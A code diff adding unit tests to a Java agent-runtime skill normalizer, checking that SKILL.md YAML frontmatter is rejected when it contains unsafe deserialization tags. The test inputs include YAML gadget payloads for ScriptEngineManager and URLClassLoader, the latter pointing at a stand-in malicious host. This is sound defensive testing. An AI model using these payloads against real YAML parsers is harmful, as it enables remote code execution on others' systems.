@@ -13,6 +13,7 @@
 package org.conductoross.conductor.ai.agentspan.runtime.normalizer;
 
 import java.io.InputStream;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
@@ -481,5 +482,67 @@ class SkillNormalizerTest {
         assertTrue(
                 instructions.contains("A large skill for testing section splitting"),
                 "Instructions should contain the skill description");
+    }
+
+    @Test
+    void parseFrontmatterRejectsGlobalScriptEngineManagerTag() throws Exception {
+        Map<String, Object> raw = new HashMap<>(loadFixture("simple-skill"));
+        raw.put(
+                "skillMd",
+                "---\nname: poc\nvalue: !!javax.script.ScriptEngineManager [{}]\n---\n# body\n");
+        IllegalArgumentException ex =
+                assertThrows(IllegalArgumentException.class, () -> normalizer.normalize(raw));
+        assertTrue(
+                ex.getMessage().contains("Invalid SKILL.md frontmatter"),
+                "Expected invalid frontmatter rejection, got: " + ex.getMessage());
+    }
+
+    @Test
+    void parseFrontmatterRejectsGlobalUrlClassLoaderTag() throws Exception {
+        Map<String, Object> raw = new HashMap<>(loadFixture("simple-skill"));
+        raw.put(
+                "skillMd",
+                "---\nname: poc\nvalue: !!java.net.URLClassLoader [\"http://malicious.example.com\"]\n---\n# body\n");
+        IllegalArgumentException ex =
+                assertThrows(IllegalArgumentException.class, () -> normalizer.normalize(raw));
+        assertTrue(
+                ex.getMessage().contains("Invalid SKILL.md frontmatter"),
+                "Expected invalid frontmatter rejection, got: " + ex.getMessage());
+    }
+
+    @Test
+    void parseFrontmatterRejectsVerbatimTagDescriptor() throws Exception {
+        Map<String, Object> raw = new HashMap<>(loadFixture("simple-skill"));
+        raw.put(
+                "skillMd",
+                "---\nname: poc\nvalue: !<javax.script.ScriptEngineManager> [{}]\n---\n# body\n");
+        IllegalArgumentException ex =
+                assertThrows(IllegalArgumentException.class, () -> normalizer.normalize(raw));
+        assertTrue(
+                ex.getMessage().contains("Invalid SKILL.md frontmatter"),
+                "Expected invalid frontmatter rejection, got: " + ex.getMessage());
+    }
+
+    @Test
+    void parseFrontmatterRejectsNonMappingRoot() throws Exception {
+        Map<String, Object> raw = new HashMap<>(loadFixture("simple-skill"));
+        raw.put("skillMd", "---\n- item1\n- item2\n---\n# body\n");
+        IllegalArgumentException ex =
+                assertThrows(IllegalArgumentException.class, () -> normalizer.normalize(raw));
+        assertTrue(
+                ex.getMessage().contains("must be a mapping"),
+                "Expected non-mapping rejection, got: " + ex.getMessage());
+    }
+
+    @Test
+    void parseFrontmatterParsesValidMetadataWithSafeTagsAndBlockScalars() throws Exception {
+        Map<String, Object> raw = new HashMap<>(loadFixture("simple-skill"));
+        raw.put(
+                "skillMd",
+                "---\nname: !!str safe-skill\ndescription: |\n  Step 1: Check prerequisites\n  Step 2: !important note\nversion: 1.0.0\nmetadata:\n  author: conductor-team\n---\n# Safe Skill\nBody content here.\n");
+        AgentConfig config = normalizer.normalize(raw);
+        assertEquals("safe-skill", config.getName());
+        assertTrue(config.getDescription().contains("!important note"));
+        assertEquals(Map.of("author", "conductor-team"), config.getMetadata());
     }
 }
